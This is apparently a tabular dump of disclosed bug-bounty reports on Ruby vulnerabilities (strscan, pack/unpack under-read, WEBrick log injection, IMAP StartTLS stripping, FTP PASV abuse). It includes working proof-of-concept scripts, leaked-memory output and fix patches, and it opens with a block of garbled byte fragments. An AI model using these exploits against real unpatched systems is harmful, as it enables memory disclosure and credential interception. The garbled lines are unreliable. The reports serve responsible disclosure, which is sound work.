108^<	 M
109PF	Y
110H	$M
111)d	nW
1124,	'b
113@	;y
114^P	(
115^T	`
116^X	]
117\	g2
118		6%
119^<	 M
120PF	Y
121H	$M
122)d	nW
1234,	'b
124@	;y
125^P	(
126^T	`
127^X	]
128\	g2
129		6%
Proposed patch is as follows. Note that I avoid the easy way of checking for overflow ie.
Code 19 BytesWrap lines Copy Download1beg_i + len < beg_i
since that implies a signed integer overflow which is officially undefined behavior in C and reportedly may lead to unexpected results on some architectures. But feel free to implement a patch however you want.
Code 481 BytesWrap lines Copy Download1diff --git a/ext/strscan/strscan.c b/ext/strscan/strscan.c
2index 9b52fea..7dfe17a 100644
3--- a/ext/strscan/strscan.c
4+++ b/ext/strscan/strscan.c
5@@ -153,7 +153,7 @@ static VALUE
6 extract_beg_len(struct strscanner *p, long beg_i, long len)
7 {
8     if (beg_i > S_LEN(p)) return Qnil;
9-    if (beg_i + len > S_LEN(p))
10+    if (len < 0 || beg_i > (LONG_MAX - len) || beg_i + len > S_LEN(p))
11         len = S_LEN(p) - beg_i;
12     return infect(str_new(p, S_PBEG(p) + beg_i, len), p);
13 }
Note that malice isn't necessarily required to trigger this vulnerability; any Ruby program that uses strscan to simply operate on large buffers may unknowingly exfiltrate secret data (if the peek()'d data ever leaves the system).
The vulnerability is not expected to work on 64 bit systems because of the much larger limits of the long type, and the requirement that the sizes of the buffers and available heap memory are accordingly large.
Tested on ruby-2.3.1",https://hackerone.com/reports/166661,No value,No value,No value,2016,9,7,20,12
Ruby,501-1000,1.0,No value,$500.00,No value,0.0,Memory Corruption - Generic,Buffer underflow in sprintf,"haquaman  submitted a report to Ruby.Dec 18th (6 years ago)Hi,
So I found this in mruby as part of the shopify-scripts program, and I notice that my patch also landed upstream in ruby as well. Shame on me for not checking ruby as well!
Wondered if it counted for a bounty here as well?
https://github.com/mruby/mruby/issues/3347 <- issue that shopify guys opened on my behalf.
https://github.com/ruby/ruby/commit/0854193a684acc2b3a13ab28091a4397000c8822 <- commit landed upstream.
https://hackerone.com/reports/191328 (still open so not public) is the original report of mine.
Let me know if you need anything more.
Cheers,
Hugh",https://hackerone.com/reports/192127,No value,No value,No value,2016,12,18,5,30
Ruby,501-1000,1.0,No value,$500.00,Medium,6.2,Buffer Under-read,controlled buffer under-read in pack_unpack_internal(),"aerodudrizzt  submitted a report to Ruby.Dec 15th (5 years ago)Brief
There is a signedness error in the pack_unpack_internal(), allowing the '@' type to trigger a buffer under-read when unpacking with a controlled format (similar to format string implementation vulnerabilities).
Code Vulnerability
Vulnerable version: 2.5.0 (rc) and prior (tested also on 2.3.3)
Scope: works on 32 bit and 64 bit versions
File: pack.c
Function: pack_unpack_internal()
Code Trace:


len is a signed long: 
Code 13 BytesWrap lines Copy Download1    long len;


len can be parsed using a decimal string representation, to hold any unsigned long value
Code 156 BytesWrap lines Copy Download1...
2else if (ISDIGIT(*p)) {
3    errno = 0;
4	len = STRTOUL(p, (char**)&p, 10);
5    if (errno) {
6	rb_raise(rb_eRangeError, ""pack length too big"");
7    }
8}
9...


Using a negative len value, the '@' type will move the string backwards:
Code 256 BytesWrap lines Copy Download1...
2case '@':
3    // EI - Trace: negative length will pass this check
4    if (len > RSTRING_LEN(str))
5	  rb_raise(rb_eArgError, ""@ outside of string"");
6     // EI - Trace: negative length will move s backwards
7    s = RSTRING_PTR(str) + len;
8    break;
9...


Later unpacking will parse memory data before the buffer's start


PoC Script
The script was tested on 32 bit. On 64 bit one should only adjust the numerical values accordingly (64 bit was tested on 2.3.3 and worked).
Code 345 BytesWrap lines Copy Download1puts 'Version: ' + RUBY_VERSION
2puts 2 ** 32 - 100
3
4puts '**********************************'
5puts 'Expected:'
6""0123456789"".unpack(""C10"").each { |x| puts x.to_s(16) }
7
8puts '**********************************'
9puts 'Leaked + Expected:'
10""0123456789"".unpack(""@4294967196C110"").each { |x| puts x.to_s(16) }
11puts '**********************************'
Output:
Code 484 BytesWrap lines Copy Download1Version: 2.5.0
24294967196
3**********************************
4Expected:
530
631
732
833
934
1035
1136
1237
1338
1439
15**********************************
16Leaked + Expected:
1728
1813
19e2
201
21c1
2224
230
240
2540
2643
27df
281
2965
3048
3192
3220
333c
347e
35df
361
3772
3865
396d
4061
4169
426e
4364
4465
4572
460
470
480
497a
5060
511
520
5330
541
55f5
561
5750
58c5
59ef
601
617f
62a3
630
640
6530
661
67f5
681
697a
7060
715
720
7340
7443
75df
761
778
7813
79e2
801
81b1
8224
830
840
8540
8643
87df
881
8965
9088
9191
9220
933c
947e
95df
961
976d
986f
9964
10075
1016c
1026f
1030
1040
1050
1060
1070
1080
1095
11080
11152
1120
1133c
1147e
115df
1161
11730
11831
11932
12033
12134
12235
12336
12437
12538
12639
127**********************************
Proposed Fix:
len should be limited to hold only positive values, and it should be enforced right after len is parsed. A different fix could be to specifically check if len is negative in all dangerous places in the unpack() function.
Impact
Impact
An attacker controlling the unpacking format (similar to format string vulnerabilities) can trigger a massive and controlled information disclosure. Since Ruby is a managed language, programmers assume that the library would catch such dangerous code samples and protect them from these types of attacks.
This vulnerability is similar to the implementation vulnerability that was found earlier this year (2017) in the format string (sprintf) module, and in both cases programmers that use an attacker controlled format can be harmed due to an implementation bug in the ruby module.hsbt Ruby staff  posted a comment. Dec 15th (5 years ago)ack, We are evaluating it.hsbt Ruby staff  posted a comment. Dec 18th (5 years ago)@adambacchus We considered that your report was a vulnerability of String#unpack. We will handle this early next year. Are you ok to this disclose schedule?aerodudrizzt   posted a comment. Dec 18th (5 years ago)Thanks for the fast response. I am fine with the disclosure schedule.aerodudrizzt   posted a comment. Feb 14th (5 years ago)Any update regarding this ticket? I failed to find a commit that patches this vulnerability in the git repos.hsbt Ruby staff  posted a comment. Feb 17th (5 years ago)Sorry, there is no update. Because the maintainer related your report lost him authentication of hackerone. We could not handle this.aerodudrizzt   posted a comment. Feb 17th (5 years ago)OK. Do you know when approximately this ticket will be handled?hsbt Ruby staff  changed the status to Triaged. Mar 1st (5 years ago)hsbt Ruby staff  posted a comment. Mar 8th (5 years ago)@aerodudrizzt Can you review attached patch? 1 attachment:F270478: fix-underflow.patchaerodudrizzt   posted a comment. Mar 8th (5 years ago)The patch will fix the vulnerability.hsbt Ruby staff  updated CVE reference to CVE-2018-8778. Mar 20th (5 years ago)hsbt Ruby staff  closed the report and changed the status to Resolved. Mar 29th (5 years ago)We fixed this report with Ruby 2.2.10, 2.3.7, 2.4.4, 2.5.1The Internet Bug Bounty  rewarded aerodudrizzt with a $500 bounty. Mar 30th (5 years ago)hsbt Ruby staff  requested to disclose this report. Mar 30th (5 years ago)aerodudrizzt   posted a comment. Mar 30th (5 years ago)Thanks for the reward.aerodudrizzt   agreed to disclose this report. Mar 30th (5 years ago)  This report has been disclosed. Mar 30th (5 years ago)",https://hackerone.com/reports/298246,No value,No value,No value,2017,12,15,12,21
Ruby,501-1000,1.0,No value,$500.00,Medium,6.3,Command Injection - Generic,Escape sequence injection vulnerability in WEBrick BasicAuth,"mame  submitted a report to Ruby.Apr 24th (6 years ago)WEBrick BasicAuth outputs any non-existing user name to logs without sanitizing.  By exploting this, an attacker can inject malicious escape sequences to its logs.  This issue is exactly the same as the old already-fixed vulnerability.
How to reproduce:
1) Run this WEBrick server program in a terminal.
Code 331 BytesWrap lines Copy Download1require ""webrick""
2require ""webrick/httpauth""
3
4srv = WEBrick::HTTPServer.new({ Port: 34567 })
5db = WEBrick::HTTPAuth::Htpasswd.new(""dot.htpasswd"")
6authenticator = WEBrick::HTTPAuth::BasicAuth.new(UserDB: db, Realm: ""realm"")
7srv.mount_proc(""/"") do |req, res|
8  authenticator.authenticate(req, res)
9  res.body = ""foobar""
10end
11srv.start
2) Run this attack access program in another terminal.
Code 172 BytesWrap lines Copy Download1require ""open-uri""
2
3open(""http://localhost:34567/login"",
4  http_basic_authentication: [
5      ""ESCAPE SEQUENCE HERE->\e]2;BOOM!\a<-SEE WINDOW TITLE"",
6      ""passwd""
7]).read
3) See the first terminal that runs the server.  You will see a line like this, and its window title changed ""BOOM!"".
Code 107 BytesWrap lines Copy Download1[2017-04-24 19:23:46] ERROR Basic realm: ESCAPE SEQUENCE HERE-><-SEE WINDOW TITLE: the user is not allowed.
Note: I'm a member of the ruby-core team, but I'm not involved with development of WEBrick.  I did not create the bug, of course.  I will happily accept any bounty if any :-)",https://hackerone.com/reports/223363,No value,No value,No value,2017,4,24,10,25
Ruby,501-1000,1.0,No value,$500.00,Medium,6.5,Cryptographic Issues - Generic,imap: StartTLS stripping attack (CVE-2016-0772).,"chinarulezzz  submitted a report to Ruby.Apr 28th (2 years ago)net/imap does not seem to raise an exception when the remote end (imap server)  fails to respond with tagged_response (NO/BAD) or OK to an explicit call of imap.starttls. This may allow a malicious MITM to perform a starttls stripping attack if the client code does not explicitly set usessl = true on  initialize where it is disabled by default: it is rarely done as one might expect that starttls raises an exception when starttls negotiation fails (like when using usessl on a server that does not support it or when it fails to negotiate tls due to an ssl exception/cipher mismatch/auth fail).
The vulnerable code:
Code 433 BytesWrap lines Copy Download1    def starttls(options = {}, verify = true)
2      send_command(""STARTTLS"") do |resp|
3        if resp.kind_of?(TaggedResponse) && resp.name == ""OK""
4          begin
5            # for backward compatibility
6            certs = options.to_str
7            options = create_ssl_params(certs, verify)
8          rescue NoMethodError
9          end
10          start_tls_session(options)
11        end # <--- End of handling :)
12      end
13    end
PoC
For instance, we have the following client code:
Code 247 BytesWrap lines Copy Download1require 'net/imap'
2
3imap = Net::IMAP.new('0.0.0.0', 9999)
4imap.starttls
5imap.login('myLOGIN','myPASSWORD')                                            # test login
6#imap.authenticate('LOGIN', 'joe_user', 'joes_password') # test auth
7imap.disconnect
Start the proxy: python striptls.py -l 0.0.0.0:9999 -r imap.yandex.ru:143 -x IMAP.StripWithError
(See striptls.py in attachments).
Proxy output:
Code 1.10 KiBWrap lines Copy Download1$  python striptls.py -l 0.0.0.0:9999 -r imap.yandex.ru:143 -x IMAP.StripWithError
22021-04-28 18:43:27,286 - INFO     - <Session 0x7fd5850b3c10> client ('127.0.0.1', 39154) has connected
32021-04-28 18:43:27,286 - INFO     - <Session 0x7fd5850b3c10> connecting to target ('imap.yandex.ru', 143)
42021-04-28 18:43:27,347 - DEBUG    - <Session 0x7fd5850b3c10> [client] <= [server]          '* OK Yandex IMAP4rev1 at myt3-8d2078fedea5.qloud-c.yandex.net:143 ready to talk with ::ffff:188.138.209.162:62549, 2021-Apr-28 18:43:52, qheZ7J3friE1\r\n'
52021-04-28 18:43:27,348 - DEBUG    - <RewriteDispatcher  - changed mangle: __main__.StripWithError new: True>
62021-04-28 18:43:27,348 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server]          'RUBY0001 STARTTLS\r\n'
72021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] <= [server][mangled] 'RUBY0001 BUG unhandled command\r\n'
82021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server][mangled] None
92021-04-28 18:43:27,349 - DEBUG    - <Session 0x7fd5850b3c10> [client] => [server]          'RUBY0002 LOGIN myLOGIN myPASSWORD\r\n'
10...
As you can see, starttls did not return any error to the client and LOGIN authentication started.
AUTH is the same:
Code 2.07 KiBWrap lines Copy Download12021-04-28 18:47:00,579 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'RUBY0001 STARTTLS\r\n'
22021-04-28 18:47:00,579 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] 'RUBY0001 BUG unhandled command\r\n'
32021-04-28 18:47:00,579 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None
42021-04-28 18:47:00,579 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'RUBY0002 AUTHENTICATE'
52021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          ' LOGIN\r\n'
62021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] '+\r\n'
72021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None
82021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'am9lX3VzZXI=\r\n'
92021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] '+ UGFzc3dvcmQ6\r\n'
102021-04-28 18:47:00,580 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None
112021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'am9lc19wYXNzd29yZA==\r\n'
122021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] '+ UGFzc3dvcmQ6\r\n'
132021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None
142021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'am9lc19wYXNzd29yZA==\r\n'
152021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server][mangled] '+ UGFzc3dvcmQ6\r\n'
162021-04-28 18:47:00,581 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server][mangled] None
172021-04-28 18:47:00,582 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          'am9lc19wYXNzd29yZA=='
182021-04-28 18:47:00,582 - DEBUG    - <Session 0x7fd5850b3dd0> [client] => [server]          '\r\n'
192021-04-28 18:47:00,635 - DEBUG    - <Session 0x7fd5850b3dd0> [client] <= [server]          'RUBY0002 BAD Command syntax error. sc=PleRNJ32YGk1_281547_4-d4596b06cae3\r\n'
I set the same CVSS as CVE-2016-0772 has.
Impact
Allows man-in-the-middle attackers to bypass the TLS protections by leveraging a network position between the client and the registry to block the StartTLS command, aka a ""StartTLS stripping attack.""1 attachment:F1281885: striptls.py",https://hackerone.com/reports/1178562,No value,No value,No value,2021,4,28,16,6
Ruby,501-1000,1.0,No value,$500.00,Low,3.7,Information Disclosure,lib/net/ftp.rb: trusting PASV responses allow client abuse,"chinarulezzz  submitted a report to Ruby.Apr 2nd (2 years ago)When net/ftp performs a passive FTP transfer, it tries to using PASV.  Passive mode is what net/ftp uses by default.
A server response to a PASV command includes the (IPv4) address and port number for the client to connect back to in order to perform the actual data
transfer.
This is how the FTP protocol is designed to work.[^1] 
A malicious server can use the PASV response to trick net/ftp into connecting back to a given IP address and port, and this way potentially make it extract information about services that are otherwise private and not disclosed, for example doing port scanning and service banner extractions.
If net/ftp operates on a URL provided by a user (with by all means is an unwise setup), a user can exploit that and pass in a URL to a malicious FTP server instance without needing any server breach to perform the attack.
Other FTP clients have in the past also had this flaw and have fixed it at different points in time:

Chrome in 2009: https://github.com/chromium/chromium/commit/a1cea36673186829ab5d1d1408ac50ded3ca5850
Curl in 2020 (CVE-2020-8284) : https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8284
Firefox in 2007 (CVE-2007-1562): https://bugzilla.mozilla.org/show_bug.cgi?id=370559. In that bugzilla issue there's also a link to paper that describes exactly this and lists a few affected clients (link to archive.org since the original has vanished) https://web.archive.org/web/20070317052623/http://bindshell.net/papers/ftppasv/ftp-client-pasv-manipulation.pdf

[^1]: With one exception: EPSV. The correct behaviour is  first try the EPSV command and if that is not supported,  fall back to using PASV.
Impact
This behavior is by design (unless EPSV ALL is sent) but it could still lead to security issues depending on the context.
I encountered this issue within a web application with a server-side request forgery (SSRF) issue (but this issue applies to any form of SSRF with net/ftp as the request processor). In that context, one can get the following additional capabilities:

Reliable tcp port scanning (this is not normally possible by just providing a random ip:port to net/ftp)
Network service banner extraction (we setup the data channel on the target ip:port and extract for example an ssh banner: SSH-2.0-OpenSSH_7.2p2 Ubuntu-4ubuntu2.8 without any errors)
Potential bypass of ip/port restrictions, e.g. the server might be filtering internal IPs or allowing only specific ports (but still allowing FTP)

PoC
I used the following simple code:
Code 162 BytesWrap lines Copy Download1require 'net/ftp'
2ftp = Net::FTP.new
3ftp.connect(ARGV[0], ARGV[1])
4ftp.login
5#ftp.passive = true # by default
6ftp.getbinaryfile('/whatever', 'whatever')
7ftp.close
And the custom ftp-server:
Code 1.63 KiBWrap lines Copy Download1[Parent] Got connection from 192.168.100.2:43520... Spawned process 31749 to handle connection
2[PID 31749] SEND: 220 FTP PASV Demo Server v1.0
3[PID 31749] RECV: USER anonymous
4[PID 31749] SEND: 331 Please specify the password.
5[PID 31749] RECV: PASS anonymous@
6[PID 31749] SEND: 230 Login successful.
7[PID 31749] RECV: TYPE I
8[PID 31749] SEND: 200 Switching to Binary mode.
9[PID 31749] RECV: PASV
10[PID 31750] Handling incoming request to PASV port
11>>> Sending 127.0.0.1:8123
12[PID 31750] SEND: 227 Entering Passive Mode (127,0,0,1,31,187)
13[PID 31750] Exiting
14-------------------------------- The Port is Open ---------------------------------
15[PID 31749] RECV: RETR /whatever
16[PID 31749] SEND: 150 Opening BINARY mode data connection for /whatever (0 bytes).
17[PID 31749] SEND: 226 File send OK.
18[PID 31749] Exiting
19----------------------------------------------------------------------------------
20[Parent] Got connection from 192.168.100.2:43524... Spawned process 31787 to handle connection
21[PID 31787] SEND: 220 FTP PASV Demo Server v1.0
22[PID 31787] RECV: USER anonymous
23[PID 31787] SEND: 331 Please specify the password.
24[PID 31787] RECV: PASS anonymous@
25[PID 31787] SEND: 230 Login successful.
26[PID 31787] RECV: TYPE I
27[PID 31787] SEND: 200 Switching to Binary mode.
28[PID 31787] RECV: PASV
29[PID 31788] Handling incoming request to PASV port
30>>> 127.0.0.1:8080
31[PID 31788] SEND: 227 Entering Passive Mode (127,0,0,1,31,144)
32[PID 31788] Exiting
33------------------------------- The Port is Closed --------------------------------
34[PID 31787] RECV: ERROR: unmatched reply
35[PID 31787] Exiting
36----------------------------------------------------------------------------------
Mitigation
Currently, net/ftp can mitigate this flaw by disabling passive mode, which is enabled by default.  But this is not the best solution to this problem, perhaps, as well as disabling passive mode by default.
For example, firefox just ignores the ip address that is sent from the server. But Curl provides the option which tell to not use the IP address the server suggests in its response to curl's PASV command when curl connects the data connection. Instead curl will re-use the same IP address it already uses for the control connection. The second seems more reasonable.mame Ruby staff  posted a comment. Apr 2nd (2 years ago)Thank you for the report. @shugo, can you please check this ticket?shugo Ruby staff  posted a comment. Apr 5th (2 years ago)Thanks for your report.
I'd like to fix net/ftp to ignore the IP address sent from the server by default, and to add a new option use_pasv_ip to use the IP address sent from the server.  I think it's a rare case that use_pasv_ip is necessary.
Do you have any concerns?chinarulezzz   posted a comment. Apr 5th (2 years ago)Nope. It seems reasonable.hsbt Ruby staff  changed the status to Triaged. Apr 5th (2 years ago)shugo Ruby staff  posted a comment. Apr 6th (2 years ago)I've made the following patch.
Unfortunately new versions of Ruby have just been released yesterday, and the severity of this issue is low, so the fix will be included in the next releases of Ruby (maybe a few or several months later).
Code 8.42 KiBWrap lines Copy Download1commit be549bd6e68877731ec77f163f712189894743f7
2Author: Shugo Maeda <shugo@ruby-lang.org>
3Date:   Mon Apr 5 17:03:25 2021 +0900
4
5    Ignore IP addresses in PASV responses by default, and add new option use_pasv_ip
6    
7    This fixes CVE-2020-8284.
8    Reported by Alexandr Savca.
9
10diff --git a/lib/net/ftp.rb b/lib/net/ftp.rb
11index dc498e0..eeca328 100644
12--- a/lib/net/ftp.rb
13+++ b/lib/net/ftp.rb
14@@ -98,6 +98,10 @@ module Net
15     # When +true+, the connection is in passive mode.  Default: +true+.
16     attr_accessor :passive
17 
18+    # When +true+, use the IP address in PASV responses.  Otherwise, it uses
19+    # the same IP address for the control connection.  Default: +false+.
20+    attr_accessor :use_pasv_ip
21+
22     # When +true+, all traffic to and from the server is written
23     # to +$stdout+.  Default: +false+.
24     attr_accessor :debug_mode
25@@ -206,6 +210,9 @@ module Net
26     #                          handshake.
27     #                          See Net::FTP#ssl_handshake_timeout for
28     #                          details.  Default: +nil+.
29+    # use_pasv_ip::  When +true+, use the IP address in PASV responses.
30+    #                Otherwise, it uses the same IP address for the control
31+    #                connection.  Default: +false+.
32     # debug_mode::  When +true+, all traffic to and from the server is
33     #               written to +$stdout+.  Default: +false+.
34     #
35@@ -266,6 +273,7 @@ module Net
36       @open_timeout = options[:open_timeout]
37       @ssl_handshake_timeout = options[:ssl_handshake_timeout]
38       @read_timeout = options[:read_timeout] || 60
39+      @use_pasv_ip = options[:use_pasv_ip] || false
40       if host
41         connect(host, options[:port] || FTP_PORT)
42         if options[:username]
43@@ -1380,7 +1388,12 @@ module Net
44         raise FTPReplyError, resp
45       end
46       if m = /\((?<host>\d+(?:,\d+){3}),(?<port>\d+,\d+)\)/.match(resp)
47-        return parse_pasv_ipv4_host(m[""host""]), parse_pasv_port(m[""port""])
48+        if @use_pasv_ip
49+          host = parse_pasv_ipv4_host(m[""host""])
50+        else
51+          host = @bare_sock.remote_address.ip_address
52+        end
53+        return host, parse_pasv_port(m[""port""])
54       else
55         raise FTPProtoError, resp
56       end
57diff --git a/test/net/ftp/test_ftp.rb b/test/net/ftp/test_ftp.rb
58index 14afef8..8ab5181 100644
59--- a/test/net/ftp/test_ftp.rb
60+++ b/test/net/ftp/test_ftp.rb
61@@ -61,7 +61,7 @@ class FTPTest < Test::Unit::TestCase
62   end
63 
64   def test_parse227
65-    ftp = Net::FTP.new
66+    ftp = Net::FTP.new(nil, use_pasv_ip: true)
67     host, port = ftp.send(:parse227, ""227 Entering Passive Mode (192,168,0,1,12,34)"")
68     assert_equal(""192.168.0.1"", host)
69     assert_equal(3106, port)
70@@ -80,6 +80,14 @@ class FTPTest < Test::Unit::TestCase
71     assert_raise(Net::FTPProtoError) do
72       ftp.send(:parse227, ""227 ) foo bar ("")
73     end
74+
75+    ftp = Net::FTP.new
76+    sock = OpenStruct.new
77+    sock.remote_address = OpenStruct.new
78+    sock.remote_address.ip_address = ""10.0.0.1""
79+    ftp.instance_variable_set(:@bare_sock, sock)
80+    host, port = ftp.send(:parse227, ""227 Entering Passive Mode (192,168,0,1,12,34)"")
81+    assert_equal(""10.0.0.1"", host)
82   end
83 
84   def test_parse228
85@@ -2509,10 +2517,155 @@ EOF
86     end
87   end
88 
89+  def test_ignore_pasv_ip
90+    commands = []
91+    binary_data = (0..0xff).map {|i| i.chr}.join * 4 * 3
92+    server = create_ftp_server(nil, ""127.0.0.1"") { |sock|
93+      sock.print(""220 (test_ftp).\r\n"")
94+      commands.push(sock.gets)
95+      sock.print(""331 Please specify the password.\r\n"")
96+      commands.push(sock.gets)
97+      sock.print(""230 Login successful.\r\n"")
98+      commands.push(sock.gets)
99+      sock.print(""200 Switching to Binary mode.\r\n"")
100+      line = sock.gets
101+      commands.push(line)
102+      data_server = TCPServer.new(""127.0.0.1"", 0)
103+      port = data_server.local_address.ip_port
104+      sock.printf(""227 Entering Passive Mode (999,0,0,1,%s).\r\n"",
105+                  port.divmod(256).join("",""))
106+      commands.push(sock.gets)
107+      sock.print(""150 Opening BINARY mode data connection for foo (#{binary_data.size} bytes)\r\n"")
108+      conn = data_server.accept
109+      binary_data.scan(/.{1,1024}/nm) do |s|
110+        conn.print(s)
111+      end
112+      conn.shutdown(Socket::SHUT_WR)
113+      conn.read
114+      conn.close
115+      data_server.close
116+      sock.print(""226 Transfer complete.\r\n"")
117+    }
118+    begin
119+      begin
120+        ftp = Net::FTP.new
121+        ftp.passive = true
122+        ftp.read_timeout *= 5 if defined?(RubyVM::MJIT) && RubyVM::MJIT.enabled? # for --jit-wait
123+        ftp.connect(""127.0.0.1"", server.port)
124+        ftp.login
125+        assert_match(/\AUSER /, commands.shift)
126+        assert_match(/\APASS /, commands.shift)
127+        assert_equal(""TYPE I\r\n"", commands.shift)
128+        buf = ftp.getbinaryfile(""foo"", nil)
129+        assert_equal(binary_data, buf)
130+        assert_equal(Encoding::ASCII_8BIT, buf.encoding)
131+        assert_equal(""PASV\r\n"", commands.shift)
132+        assert_equal(""RETR foo\r\n"", commands.shift)
133+        assert_equal(nil, commands.shift)
134+      ensure
135+        ftp.close if ftp
136+      end
137+    ensure
138+      server.close
139+    end
140+  end
141+
142+  def test_use_pasv_ip
143+    commands = []
144+    binary_data = (0..0xff).map {|i| i.chr}.join * 4 * 3
145+    server = create_ftp_server(nil, ""127.0.0.1"") { |sock|
146+      sock.print(""220 (test_ftp).\r\n"")
147+      commands.push(sock.gets)
148+      sock.print(""331 Please specify the password.\r\n"")
149+      commands.push(sock.gets)
150+      sock.print(""230 Login successful.\r\n"")
151+      commands.push(sock.gets)
152+      sock.print(""200 Switching to Binary mode.\r\n"")
153+      line = sock.gets
154+      commands.push(line)
155+      data_server = TCPServer.new(""127.0.0.1"", 0)
156+      port = data_server.local_address.ip_port
157+      sock.printf(""227 Entering Passive Mode (127,0,0,1,%s).\r\n"",
158+                  port.divmod(256).join("",""))
159+      commands.push(sock.gets)
160+      sock.print(""150 Opening BINARY mode data connection for foo (#{binary_data.size} bytes)\r\n"")
161+      conn = data_server.accept
162+      binary_data.scan(/.{1,1024}/nm) do |s|
163+        conn.print(s)
164+      end
165+      conn.shutdown(Socket::SHUT_WR)
166+      conn.read
167+      conn.close
168+      data_server.close
169+      sock.print(""226 Transfer complete.\r\n"")
170+    }
171+    begin
172+      begin
173+        ftp = Net::FTP.new
174+        ftp.passive = true
175+        ftp.use_pasv_ip = true
176+        ftp.read_timeout *= 5 if defined?(RubyVM::MJIT) && RubyVM::MJIT.enabled? # for --jit-wait
177+        ftp.connect(""127.0.0.1"", server.port)
178+        ftp.login
179+        assert_match(/\AUSER /, commands.shift)
180+        assert_match(/\APASS /, commands.shift)
181+        assert_equal(""TYPE I\r\n"", commands.shift)
182+        buf = ftp.getbinaryfile(""foo"", nil)
183+        assert_equal(binary_data, buf)
184+        assert_equal(Encoding::ASCII_8BIT, buf.encoding)
185+        assert_equal(""PASV\r\n"", commands.shift)
186+        assert_equal(""RETR foo\r\n"", commands.shift)
187+        assert_equal(nil, commands.shift)
188+      ensure
189+        ftp.close if ftp
190+      end
191+    ensure
192+      server.close
193+    end
194+  end
195+
196+  def test_use_pasv_invalid_ip
197+    commands = []
198+    binary_data = (0..0xff).map {|i| i.chr}.join * 4 * 3
199+    server = create_ftp_server(nil, ""127.0.0.1"") { |sock|
200+      sock.print(""220 (test_ftp).\r\n"")
201+      commands.push(sock.gets)
202+      sock.print(""331 Please specify the password.\r\n"")
203+      commands.push(sock.gets)
204+      sock.print(""230 Login successful.\r\n"")
205+      commands.push(sock.gets)
206+      sock.print(""200 Switching to Binary mode.\r\n"")
207+      line = sock.gets
208+      commands.push(line)
209+      sock.print(""227 Entering Passive Mode (999,0,0,1,48,57).\r\n"")
210+      commands.push(sock.gets)
211+    }
212+    begin
213+      begin
214+        ftp = Net::FTP.new
215+        ftp.passive = true
216+        ftp.use_pasv_ip = true
217+        ftp.read_timeout *= 5 if defined?(RubyVM::MJIT) && RubyVM::MJIT.enabled? # for --jit-wait
218+        ftp.connect(""127.0.0.1"", server.port)
219+        ftp.login
220+        assert_match(/\AUSER /, commands.shift)
221+        assert_match(/\APASS /, commands.shift)
222+        assert_equal(""TYPE I\r\n"", commands.shift)
223+        assert_raise(SocketError) do
224+          ftp.getbinaryfile(""foo"", nil)
225+        end
226+      ensure
227+        ftp.close if ftp
228+      end
229+    ensure
230+      server.close
231+    end
232+  end
233+
234   private
235 
236-  def create_ftp_server(sleep_time = nil)
237-    server = TCPServer.new(SERVER_ADDR, 0)
238+  def create_ftp_server(sleep_time = nil, addr = SERVER_ADDR)
239+    server = TCPServer.new(addr, 0)
240     @thread = Thread.start do
241       if sleep_time
242         sleep(sleep_time)chinarulezzz   posted a comment. Apr 6th (2 years ago)LGTM. I also checked the EPSV/LPSV message parsing just in case, and everything is fine there as well. Great.
P.S. parse228/LPSV is nevertheless vulnerable (when parsing host/port), but since it is not used, everything is fine. The main thing is not to forget to fix it if you suddenly decide to introduce support for LPSV :)shugo Ruby staff  posted a comment. Apr 6th (2 years ago)
LGTM. I also checked the EPSV/LPSV message parsing just in case, and everything is fine there as well. Great.

Thanks for your review.

P.S. parse228/LPSV is nevertheless vulnerable (when parsing host/port), but since it is not used, everything is fine. The main thing is not to forget to fix it if you suddenly decide to introduce support for LPSV :)

Yes, parse228 is confusing.
I'd like to remove it after this fix is released.mame Ruby staff  posted a comment. Apr 17th (2 years ago)This report was discussed in the previous developers' meeting, and we agreed that this qualifies as a security issue. I'll ask for CVE later.shugo Ruby staff  posted a comment. May 7th (2 years ago) CVE-2021-31810 has been assigned:

[Suggested description]
An issue was discovered in Ruby through 2.6.7, 2.7.x through 2.7.3, and 3.x through 3.0.1.
A malicious FTP server can use the PASV response to trick Net::FTP
into connecting back to a given IP address and port. This
potentially makes curl extract information about services that are
otherwise private and not disclosed (e.g., the attacker can conduct port scans
and service banner extractions).

[VulnerabilityType Other]
Incorrect Access Control

[Vendor of Product]
the Ruby community

[Affected Product Code Base]
Ruby - 3.0.1 or before
Ruby - 2.7.3 or before
Ruby - 2.6.7 or before

[Affected Component]
Net::FTP

[Attack Type]
Remote

[Impact Information Disclosure]
true

[Attack Vectors]
To exploit vulnerability, a user must connect to a malicious FTP server.

[Reference]
https://hackerone.com/reports/1145454

[Has vendor confirmed or acknowledged the vulnerability?]
true

[Discoverer]
Alexandr Savca
Use CVE-2021-31810.
CVE Assignment Team
M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
[ A PGP key is available for encrypted communications at
https://cve.mitre.org/cve/request_id.html ]
hsbt Ruby staff  updated CVE reference to CVE-2021-31810. May 7th (2 years ago)shugo Ruby staff  closed the report and changed the status to Resolved. Jul 8th (about 1 year ago)We have released new versions of Ruby and have published the vulnerability.
